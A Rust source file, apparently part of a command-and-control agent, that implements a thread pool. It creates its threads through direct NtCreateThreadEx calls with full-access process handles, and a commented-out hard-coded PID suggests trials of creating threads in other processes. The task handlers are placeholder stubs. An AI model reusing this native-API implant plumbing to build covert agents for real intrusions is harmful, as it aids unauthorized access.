use crate::channel::{channel, Receiver, Sender};
use alloc::sync::Arc;
use alloc::vec::Vec;
use alloc::{boxed::Box, string::ToString};
use core::ptr::{null, null_mut};
use core::sync::atomic::AtomicBool;
use mod_agentcore::instance;
use mod_win32::nt_ps_api::{get_pid, get_proc_handle};
use mod_win32::nt_time::delay;
use rs2_communication_protocol::{
    communication_structs::task_output::TaskOutput, metadata::Metadata,
};
use rs2_win32::ntapi::nt_current_process;
use rs2_win32::ntdef::{
    ClientId, ObjectAttributes, HANDLE, OBJ_CASE_INSENSITIVE, PROCESS_ALL_ACCESS,
    PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
    PROCESS_VM_WRITE,
};

pub struct ThreadPool {
    workers: Vec<Worker>,
    sender: Option<Sender<Job>>,
}

type Job = Box<dyn FnOnce() + Send + 'static>;

impl ThreadPool {
    pub fn new(size: usize, shutdown_flag: Arc<AtomicBool>) -> Self {
        let (sender, receiver) = channel();
        let receiver = Arc::new(receiver);

        let mut workers = Vec::with_capacity(size);

        for _ in 0..size {
            workers.push(Worker::new(
                Arc::clone(&receiver),
                Arc::clone(&shutdown_flag),
            ));
        }

        ThreadPool {
            workers,
            sender: Some(sender),
        }
    }

    pub fn execute(&self, job: Job) {
        if let Some(sender) = &self.sender {
            sender.send(job).unwrap();
        }
    }

    pub fn shutdown(&mut self) {
        drop(self.sender.take());
        for worker in &mut self.workers {
            worker.join();
        }
    }
}

pub struct Worker {
    handle: Option<HANDLE>,
    shutdown_flag: Arc<AtomicBool>,
}

impl Worker {
    pub fn new(receiver: Arc<Receiver<Job>>, shutdown_flag: Arc<AtomicBool>) -> Self {
        let mut worker = Worker {
            handle: None,
            shutdown_flag,
        };

        worker.handle = Some(worker.spawn_thread(receiver));

        worker
    }

    fn spawn_thread(&self, receiver: Arc<Receiver<Job>>) -> HANDLE {
        let mut thread_handle: HANDLE = null_mut();
        let mut client_id = ClientId::new();
        let pid = unsafe { get_pid() };
        // let pid = 34512;
        client_id.unique_process = pid as _;
        // let mut obj_attr = ObjectAttributes::new();

        // Initialize object attributes for the process
        let mut obj_attr = ObjectAttributes::new();

        ObjectAttributes::initialize(
            &mut obj_attr,
            null_mut(),
            OBJ_CASE_INSENSITIVE, // 0x40
            null_mut(),
            null_mut(),
        );

        let receiver_ptr = Arc::into_raw(receiver) as *mut core::ffi::c_void;

        let proc_handle = unsafe { get_proc_handle(pid as i32, PROCESS_ALL_ACCESS) };

        let status = unsafe {
            instance().ntdll.nt_create_thread_ex.run(
                &mut thread_handle,
                0x1FFFFF,      // Full access to the thread
                &mut obj_attr, // ObjectAttributes can be null
                proc_handle,   // Handle to the current process
                worker_main as *mut _,
                receiver_ptr,
                0,          // Non create the thread in suspended state
                0,          // StackZeroBits
                0,          // SizeOfStackCommit
                0,          // SizeOfStackReserve
                null_mut(), // BytesBuffer can be null
            )
        };

        if status != 0 {
            // Recupera il puntatore in caso di errore per evitare memory leak
            let _ = unsafe { Arc::from_raw(receiver_ptr as *const Receiver<Job>) };
            panic!("Failed to create thread: {:?}", status);
        }

        thread_handle
    }

    pub fn join(&mut self) {
        if let Some(handle) = self.handle.take() {
            unsafe {
                instance()
                    .ntdll
                    .nt_wait_for_single_object
                    .run(handle, false, null_mut());
            }
        }
    }
}

extern "system" fn worker_main(lpParameter: *mut core::ffi::c_void) -> u32 {
    // Cast del parametro ricevuto a Receiver<Job>
    let receiver = unsafe { Arc::from_raw(lpParameter as *const Receiver<Job>) };

    loop {
        if let Some(job) = receiver.recv() {
            job();
        } else {
            break;
        }
    }

    0 // Codice di uscita del thread
}
pub fn task_type_a(metadata: Metadata) -> TaskOutput {
    delay(1);
    let mut output = TaskOutput::new();
    output.with_metadata(metadata);
    output.output = Some("Result from task type A".to_string());
    output
}

pub fn task_type_b(metadata: Metadata) -> TaskOutput {
    delay(3);
    let mut output = TaskOutput::new();
    output.with_metadata(metadata);
    output.output = Some("Result from task type B".to_string());
    output
}
